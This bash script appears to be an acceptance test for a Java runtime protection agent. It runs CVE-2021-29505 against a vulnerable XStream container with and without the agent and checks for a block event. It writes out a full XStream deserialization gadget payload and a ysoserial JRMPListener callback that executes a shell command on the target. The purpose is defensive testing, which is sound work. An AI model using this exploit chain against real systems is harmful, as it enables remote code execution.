#!/usr/bin/env bash
set -euo pipefail

cd "$(dirname "$0")/.."

host_agent_jar="$(pwd)/agent-java8/build/libs/ohmyrasp-agent-java8.jar"

docker run --rm -v "$(pwd):/workspace" -w /workspace gradle:jdk25 \
  gradle --no-daemon :agent-java8:agentJava8Jar

image="${OHMYRASP_VULHUB_XSTREAM_29505_IMAGE:-vulhub/xstream:1.4.16}"
baseline_name="${OHMYRASP_VULHUB_XSTREAM_29505_BASELINE_NAME:-ohmyrasp-vulhub-xstream29505-baseline}"
protected_name="${OHMYRASP_VULHUB_XSTREAM_29505_PROTECTED_NAME:-ohmyrasp-vulhub-xstream29505-protected}"
baseline_listener_name="${OHMYRASP_VULHUB_XSTREAM_29505_BASELINE_LISTENER_NAME:-ohmyrasp-vulhub-xstream29505-jrmp-baseline}"
protected_listener_name="${OHMYRASP_VULHUB_XSTREAM_29505_PROTECTED_LISTENER_NAME:-ohmyrasp-vulhub-xstream29505-jrmp-protected}"
baseline_port="${OHMYRASP_VULHUB_XSTREAM_29505_BASELINE_PORT:-19250}"
protected_port="${OHMYRASP_VULHUB_XSTREAM_29505_PROTECTED_PORT:-19251}"
baseline_listener_port="${OHMYRASP_VULHUB_XSTREAM_29505_BASELINE_LISTENER_PORT:-19252}"
protected_listener_port="${OHMYRASP_VULHUB_XSTREAM_29505_PROTECTED_LISTENER_PORT:-19253}"
ysoserial_jar="${OHMYRASP_YSOSERIAL_JAR:-/tmp/ohmyrasp-ysoserial/ysoserial.jar}"
success_file="/tmp/ohmyrasp-xstream29505-success"
baseline_dir="logs/vulhub-xstream-1.4.16-java8-baseline"
protected_dir="logs/vulhub-xstream-1.4.16-java8-protected"
protected_log="${protected_dir}/events.jsonl"

cleanup() {
  docker logs "$baseline_name" > "${baseline_dir}/container.log" 2>&1 || true
  docker logs "$protected_name" > "${protected_dir}/container.log" 2>&1 || true
  docker logs "$baseline_listener_name" > "${baseline_dir}/jrmp-listener.log" 2>&1 || true
  docker logs "$protected_listener_name" > "${protected_dir}/jrmp-listener.log" 2>&1 || true
  docker rm -f \
    "$baseline_name" \
    "$protected_name" \
    "$baseline_listener_name" \
    "$protected_listener_name" >/dev/null 2>&1 || true
}
trap cleanup EXIT

wait_for_xstream() {
  local name="$1"
  local port="$2"
  local output="$3"
  local status

  for attempt in $(seq 1 180); do
    status="$(curl -sS -o "$output" -w "%{http_code}" \
      "http://127.0.0.1:${port}/" 2>/dev/null || true)"
    if [[ "$status" == "200" ]]; then
      printf 'http_ready_attempt=%s status=%s\n' "$attempt" "$status" >> "$(dirname "$output")/attempts.log"
      return
    fi
    sleep 1
  done

  docker logs "$name" >&2 || true
  echo "${name} did not expose XStream demo at ${port}" >&2
  exit 1
}

expect_protected_startup_without_detection() {
  if ! grep -q '"event":"ohmyrasp-java8-agent-start"' "$protected_log"; then
    sed -n '1,120p' "$protected_log" >&2 || true
    echo "missing Java 8 startup event in protected XStream 1.4.16 container" >&2
    exit 1
  fi
  if ! grep -q '"deserialization_hook":"installed"' "$protected_log"; then
    sed -n '1,120p' "$protected_log" >&2
    echo "missing Java 8 deserialization hook startup marker in protected XStream 1.4.16 container" >&2
    exit 1
  fi
  if grep -q '"event":"ohmyrasp-detection"' "$protected_log"; then
    sed -n '1,160p' "$protected_log" >&2
    echo "protected XStream 1.4.16 container produced a detection before exploit traffic" >&2
    exit 1
  fi
}

container_gateway() {
  local name="$1"
  docker exec "$name" sh -c 'ip route' | awk '/default/ {print $3; exit}'
}

start_jrmp_listener() {
  local name="$1"
  local port="$2"
  local dir="$3"
  local ysoserial_dir
  local ysoserial_file

  if [[ ! -s "$ysoserial_jar" ]]; then
    echo "ysoserial jar not found at ${ysoserial_jar}" >&2
    exit 1
  fi

  ysoserial_dir="$(cd "$(dirname "$ysoserial_jar")" && pwd)"
  ysoserial_file="$(basename "$ysoserial_jar")"
  docker rm -f "$name" >/dev/null 2>&1 || true
  docker run -d --name "$name" --network host \
    -v "${ysoserial_dir}:/ysoserial:ro" -w /ysoserial \
    eclipse-temurin:8-jre \
    java -cp "$ysoserial_file" ysoserial.exploit.JRMPListener \
      "$port" CommonsCollections6 "touch ${success_file}" >/dev/null

  for attempt in $(seq 1 30); do
    docker logs "$name" > "${dir}/jrmp-listener.log" 2>&1 || true
    if grep -q "Opening JRMP listener on ${port}" "${dir}/jrmp-listener.log"; then
      printf 'jrmp_ready_attempt=%s port=%s\n' "$attempt" "$port" >> "${dir}/attempts.log"
      return
    fi
    if ! docker ps --filter "name=${name}" --filter "status=running" --format '{{.Names}}' | grep -q .; then
      cat "${dir}/jrmp-listener.log" >&2 || true
      echo "JRMP listener ${name} exited before becoming ready" >&2
      exit 1
    fi
    sleep 1
  done

  cat "${dir}/jrmp-listener.log" >&2 || true
  echo "JRMP listener ${name} did not become ready on ${port}" >&2
  exit 1
}

stop_jrmp_listener() {
  local name="$1"
  local dir="$2"
  docker logs "$name" > "${dir}/jrmp-listener.log" 2>&1 || true
  docker rm -f "$name" >/dev/null 2>&1 || true
}

write_xstream_payload() {
  local host="$1"
  local port="$2"
  local output="$3"

  sed \
    -e "s/@@JRMP_HOST@@/${host}/g" \
    -e "s/@@JRMP_PORT@@/${port}/g" \
    > "$output" <<'XML'
<java.util.PriorityQueue serialization='custom'>
    <unserializable-parents/>
    <java.util.PriorityQueue>
        <default>
            <size>2</size>
        </default>
        <int>3</int>
        <javax.naming.ldap.Rdn_-RdnEntry>
            <type>12345</type>
            <value class='com.sun.org.apache.xpath.internal.objects.XString'>
                <m__obj class='string'>com.sun.xml.internal.ws.api.message.Packet@2002fc1d Content</m__obj>
            </value>
        </javax.naming.ldap.Rdn_-RdnEntry>
        <javax.naming.ldap.Rdn_-RdnEntry>
            <type>12345</type>
            <value class='com.sun.xml.internal.ws.api.message.Packet' serialization='custom'>
                <message class='com.sun.xml.internal.ws.message.saaj.SAAJMessage'>
                    <parsedMessage>true</parsedMessage>
                    <soapVersion>SOAP_11</soapVersion>
                    <bodyParts/>
                    <sm class='com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl'>
                        <attachmentsInitialized>false</attachmentsInitialized>
                        <nullIter class='com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator'>
                            <aliases class='com.sun.jndi.toolkit.dir.LazySearchEnumerationImpl'>
                                <candidates class='com.sun.jndi.rmi.registry.BindingEnumeration'>
                                    <names>
                                        <string>aa</string>
                                        <string>aa</string>
                                    </names>
                                    <ctx>
                                        <environment/>
                                        <registry class='sun.rmi.registry.RegistryImpl_Stub' serialization='custom'>
                                            <java.rmi.server.RemoteObject>
                                                <string>UnicastRef</string>
                                                <string>@@JRMP_HOST@@</string>
                                                <int>@@JRMP_PORT@@</int>
                                                <long>0</long>
                                                <int>0</int>
                                                <long>0</long>
                                                <short>0</short>
                                                <boolean>false</boolean>
                                            </java.rmi.server.RemoteObject>
                                        </registry>
                                        <host>@@JRMP_HOST@@</host>
                                        <port>@@JRMP_PORT@@</port>
                                    </ctx>
                                </candidates>
                            </aliases>
                        </nullIter>
                    </sm>
                </message>
            </value>
        </javax.naming.ldap.Rdn_-RdnEntry>
    </java.util.PriorityQueue>
</java.util.PriorityQueue>
XML
}

send_payload() {
  local port="$1"
  local payload="$2"
  local output="$3"

  curl -sS -o "$output" -w "%{http_code}" \
    -H 'Content-Type: application/xml' \
    --data-binary "@${payload}" \
    "http://127.0.0.1:${port}/" || true
}

wait_for_marker() {
  local name="$1"
  for _ in $(seq 1 20); do
    if docker exec "$name" sh -c "test -e '${success_file}'"; then
      return
    fi
    sleep 1
  done
  return 1
}

wait_for_block_event() {
  for _ in $(seq 1 20); do
    if grep -Eq '"algorithm":"java8_deserialization_gadget_class".*"action":"block"' "$protected_log"; then
      return
    fi
    sleep 1
  done
  return 1
}

rm -rf "$baseline_dir" "$protected_dir"
mkdir -p "$baseline_dir" "$protected_dir"
: > "$protected_log"
chmod 666 "$protected_log"
docker rm -f \
  "$baseline_name" \
  "$protected_name" \
  "$baseline_listener_name" \
  "$protected_listener_name" >/dev/null 2>&1 || true

docker image inspect "$image" --format '{{json .Config.Env}}' > "${baseline_dir}/image-env.json"
docker run --rm --entrypoint sh "$image" -lc 'java -version' \
  > "${baseline_dir}/java-version.log" 2>&1

docker run -d --name "$baseline_name" \
  -p "${baseline_port}:8080" \
  "$image" >/dev/null

wait_for_xstream "$baseline_name" "$baseline_port" "${baseline_dir}/home.response"
baseline_gateway="$(container_gateway "$baseline_name")"
baseline_payload="${baseline_dir}/registryimpl-stub.xml"
write_xstream_payload "$baseline_gateway" "$baseline_listener_port" "$baseline_payload"
docker exec "$baseline_name" rm -f "$success_file"
start_jrmp_listener "$baseline_listener_name" "$baseline_listener_port" "$baseline_dir"
baseline_status="$(send_payload "$baseline_port" "$baseline_payload" "${baseline_dir}/exploit.response")"
printf 'exploit_status=%s\n' "$baseline_status" >> "${baseline_dir}/attempts.log"
if [[ "$baseline_status" == "000" ]]; then
  sed -n '1,120p' "${baseline_dir}/exploit.response" >&2 || true
  echo "baseline XStream CVE-2021-29505 request did not reach the server" >&2
  exit 1
fi
if ! wait_for_marker "$baseline_name"; then
  sed -n '1,120p' "${baseline_dir}/exploit.response" >&2 || true
  docker logs "$baseline_name" >&2 || true
  echo "baseline XStream CVE-2021-29505 did not create ${success_file}" >&2
  exit 1
fi
printf 'marker=present\n' >> "${baseline_dir}/attempts.log"
stop_jrmp_listener "$baseline_listener_name" "$baseline_dir"
if ! grep -q '^Have connection from ' "${baseline_dir}/jrmp-listener.log"; then
  cat "${baseline_dir}/jrmp-listener.log" >&2 || true
  echo "baseline XStream CVE-2021-29505 did not reach JRMPListener" >&2
  exit 1
fi

docker run -d --name "$protected_name" \
  -p "${protected_port}:8080" \
  -v "${host_agent_jar}:/opt/ohmyrasp/ohmyrasp-agent-java8.jar:ro" \
  -v "$(pwd)/${protected_dir}:/opt/ohmyrasp/logs" \
  -e "JAVA_TOOL_OPTIONS=-javaagent:/opt/ohmyrasp/ohmyrasp-agent-java8.jar -Dohmyrasp.java8.log=/opt/ohmyrasp/logs/events.jsonl -Dohmyrasp.java8.block=true" \
  "$image" >/dev/null

wait_for_xstream "$protected_name" "$protected_port" "${protected_dir}/home.response"
expect_protected_startup_without_detection
protected_gateway="$(container_gateway "$protected_name")"
protected_payload="${protected_dir}/registryimpl-stub.xml"
write_xstream_payload "$protected_gateway" "$protected_listener_port" "$protected_payload"
docker exec "$protected_name" rm -f "$success_file"
start_jrmp_listener "$protected_listener_name" "$protected_listener_port" "$protected_dir"
protected_status="$(send_payload "$protected_port" "$protected_payload" "${protected_dir}/exploit.response")"
printf 'exploit_status=%s\n' "$protected_status" >> "${protected_dir}/attempts.log"
if [[ "$protected_status" == "000" ]]; then
  sed -n '1,120p' "${protected_dir}/exploit.response" >&2 || true
  echo "protected XStream CVE-2021-29505 request did not reach the server" >&2
  exit 1
fi
if ! wait_for_block_event; then
  sed -n '1,220p' "$protected_log" >&2 || true
  echo "missing java8_deserialization_gadget_class block event for XStream CVE-2021-29505" >&2
  exit 1
fi
sleep 2
if docker exec "$protected_name" sh -c "test -e '${success_file}'"; then
  sed -n '1,220p' "$protected_log" >&2 || true
  echo "protected XStream CVE-2021-29505 created ${success_file} despite block event" >&2
  exit 1
fi
printf 'marker=absent\n' >> "${protected_dir}/attempts.log"
stop_jrmp_listener "$protected_listener_name" "$protected_dir"
if ! grep -q '^Have connection from ' "${protected_dir}/jrmp-listener.log"; then
  cat "${protected_dir}/jrmp-listener.log" >&2 || true
  echo "protected XStream CVE-2021-29505 did not reach JRMPListener for second-stage test" >&2
  exit 1
fi

echo "vulhub XStream CVE-2021-29505 Java8 acceptance passed"
